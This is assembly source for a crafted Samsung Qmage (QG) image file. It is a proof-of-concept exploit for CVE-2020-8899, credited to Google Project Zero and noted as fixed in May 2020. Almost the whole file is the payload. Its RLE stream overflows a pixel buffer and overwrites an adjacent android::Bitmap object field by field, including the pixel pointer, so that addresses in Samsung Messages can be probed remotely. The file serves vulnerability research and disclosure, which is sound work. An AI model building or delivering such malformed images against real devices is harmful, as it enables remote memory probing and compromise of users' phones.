;
; Samsung Qmage codec exploit proof-of-concept for remotely probing a specific
; range of virtual addresses in the Samsung Messages address space.
;
; Author:  Mateusz Jurczyk, Google Project Zero
; Date:    August 2020
; Bug:     CVE-2020-8899 (crash e418c0496cb1babf0eba13026f4d1504)
; Fixed:   Samsung May 2020 Security Bulletin (SVE-2020-16747)
;

_QMG_HEADER:

  db 'QG'              ; Signature
  db 0x01, 0x02, 0x01  ; Version 1.2.1 (equivalent to 2.0)
  db 0x30              ; Flags: PREMULTIPLIED | INDEXED_COLOR
  db 0x64              ; Quality: 100 (best)
  dw 0x0004            ; Width: 4
  dw 0x000A            ; Height: 10
  db 0x00              ; Extra header length: 0

_COLOR_TABLE_HEADER:

  db 0xFF              ; Number of colors: 255 (256 expected by the codec)
  dw 0x0011            ; Length of the compressed color table: 17

_COMPRESSED_COLOR_TABLE:

  ; Zlib compressed stream of 1024 'A's, which makes up the color table
  ; consisting of 256 32-bpp entries.
  
  db 0x78, 0x9c, 0x73, 0x74, 0x1c, 0x05, 0xa3, 0x60, 0x14, 0x8c, 0x54, 0x00
  db 0x00, 0xa4, 0x78, 0x04, 0x10

_DATA_STREAM_START:

  ; Required marker bytes.
  db 0xFF, 0x00

  ; Compression type: Run Length Encoding
  db 0x06

_RLE_STREAM_START:

  ; Length of the overall RLE stream in bytes (excluding this DWORD).
  dd (_RLE_STREAM_END - _RLE_STREAM_START - 4)

  ; Number of different, subsequent bytes written to the output buffer during
  ; decompression, which is somewhere between 160 and 320 in our case, depending
  ; on how many bytes of the adjacent object we wish to overwrite.
  dd (_RLE_DATA_END - _RLE_DATA_START)

_RLE_DATA_START:

  ; Padding for the legitimate pixel storage buffer.
  times 160 db 0xcc

  ; ============================================================================
  ; Start of the overwritten android::Bitmap object
  ; ============================================================================

  ; class ANDROID_API Bitmap : public SkPixelRef {
  dq 0x4141414141414141       ; /* +0x00 */    void *vtable;
                              ;                class SK_API SkRefCntBase {
  dd 0x41414141               ; /* +0x08 */        mutable std::atomic<int32_t> fRefCnt;
                              ;                }
                              ;                class SK_API SkPixelRef : public SkRefCnt {
  dd 1                        ; /* +0x0C */        int                 fWidth;
  dd 1                        ; /* +0x10 */        int                 fHeight;
  dd 0x41414141               ; /* +0x14 */        <padding>
  dq 0xdddddddddddddddd       ; /* +0x18 */        void*               fPixels;
  dq 0x1000                   ; /* +0x20 */        size_t              fRowBytes;
  dd 0x41414141               ; /* +0x28 */        mutable std::atomic<uint32_t> fTaggedGenID;
  dd 0x41414141               ; /* +0x2c */        <padding>
                              ;                    SkIDChangeListener::List fGenIDChangeListeners {
                              ;                       SkMutex fMutex {
  dd 0x41414141               ; /* +0x30 */             std::atomic<int> fCount;
  db 0x41                     ; /* +0x34 */             SkOnce           fOSSemaphoreOnce;
  times 3 db 0x41             ; /* +0x35 */             <padding>
  dq 0x4141414141414141       ; /* +0x38 */             OSSemaphore*     fOSSemaphore;
                              ;                       }
                              ;                       SkTDArray<SkIDChangeListener*> fListeners {
  dq 0x4141414141414141       ; /* +0x40 */             SkIDChangeListener*      fArray;
  dd 0x41414141               ; /* +0x48 */             int     fReserve;
  dd 0x41414141               ; /* +0x4C */             int     fCount;
                              ;                       }
                              ;                    }
  db 0x41                     ; /* +0x50 */        std::atomic<bool> fAddedToCache;
  db 0x41                     ; /* +0x51 */        enum Mutability {
                              ; /* +0x51 */            kMutable,
                              ; /* +0x51 */            kTemporarilyImmutable,
                              ; /* +0x51 */            kImmutable,
                              ; /* +0x51 */        } fMutability : 8;
  times 6 db 0x41             ; /* +0x52 */        <padding>
                              ;                SkImageInfo mInfo {
  dq 0x0                      ; /* +0x58 */      sk_sp<SkColorSpace> fColorSpace;
  dd 0x1                      ; /* +0x60 */      int                 fWidth;
  dd 0x1                      ; /* +0x64 */      int                 fHeight;
  dd 0x6                      ; /* +0x68 */      SkColorType         fColorType;
  dd 0x41414141               ; /* +0x6C */      SkAlphaType         fAlphaType;
                              ;                }
  dd 0x41414141               ; /* +0x70 */    const PixelStorageType mPixelStorageType;
  dd 0x41414141               ; /* +0x74 */    BitmapPalette mPalette;
  dd 0x41414141               ; /* +0x78 */    uint32_t mPaletteGenerationId;
  db 0x41                     ; /* +0x7C */    bool mHasHardwareMipMap;
  times 3 db 0x41             ; /* +0x7D */    <padding>
                              ;                union {
                              ;                    struct {
  dq 0x4141414141414141       ; /* +0x80 */            void* address;
  dq 0x4141414141414141       ; /* +0x88 */            void* context;
  dq 0x4141414141414141       ; /* +0x90 */            FreeFunc freeFunc;
                              ;                    } external;
                              ;                    struct {
                              ; /* +0x80 */            void* address;
                              ; /* +0x88 */            int fd;
                              ; /* +0x90 */            size_t size;
                              ;                    } ashmem;
                              ;                    struct {
                              ; /* +0x80 */            void* address;
                              ; /* +0x88 */            size_t size;
                              ;                    } heap;
                              ;                    struct {
                              ; /* +0x80 */            GraphicBuffer* buffer;
                              ;                    } hardware;
                              ;                } mPixelStorage;
  dq 0x0                      ; /* +0x98 */    sk_sp<SkImage> mImage;
                              ;}

_RLE_DATA_END:
_RLE_LENGTHS_START:

; An encoded 0xAA byte denotes four single-byte runs in the stream.
times ((_RLE_DATA_END - _RLE_DATA_START) / 4) db 0xAA

_RLE_LENGTHS_END:
_RLE_STREAM_END:

; Trailing marker found in valid QG files.
db 0xFF, 0x00
